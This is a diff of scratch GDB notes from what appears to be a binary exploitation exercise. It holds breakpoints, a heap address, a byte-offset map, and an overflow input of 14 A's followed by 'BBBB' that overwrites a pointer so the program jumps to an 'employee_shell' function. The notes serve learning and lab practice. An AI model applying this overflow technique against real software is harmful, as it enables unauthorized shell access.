@@ -4,10 +4,48 @@ break *main+198
 break *main+254
 
 # For the password comparison
-break *main+356
+break *main+493
 
 
 MALLOC MEMORY AT: 0x4056b0
 0x4056b0:       0x00000000      0x00000000      0x4872636e      0x00686272
 
 
+12 A's, then a \n\r
+
+AAAAAAAAAAAA
+
+send 6 A's
+
+
+0x4056b0 : a
+0x4056b1 : a
+0x4056b2 : a
+0x4056b3
+0x4056b4
+0x4056b5
+0x4056b6
+0x4056b7
+0x4056b8
+0x4056b9
+0x4056ba
+0x4056bb
+0x4056bc
+0x4056bd
+0x4056be
+0x4056bf
+0x4056c0
+
+
+OFFSET OF ADDRESS IS 14
+
+
+General GDB debugging:
+auth
+reset
+service AAAAAAAAAAAAAABBBB    <- BBBB's is my address of employee_shell
+
+AAAAAAAAAAAAAABBBB
+AAAAAAAABBBB
+
+00401226
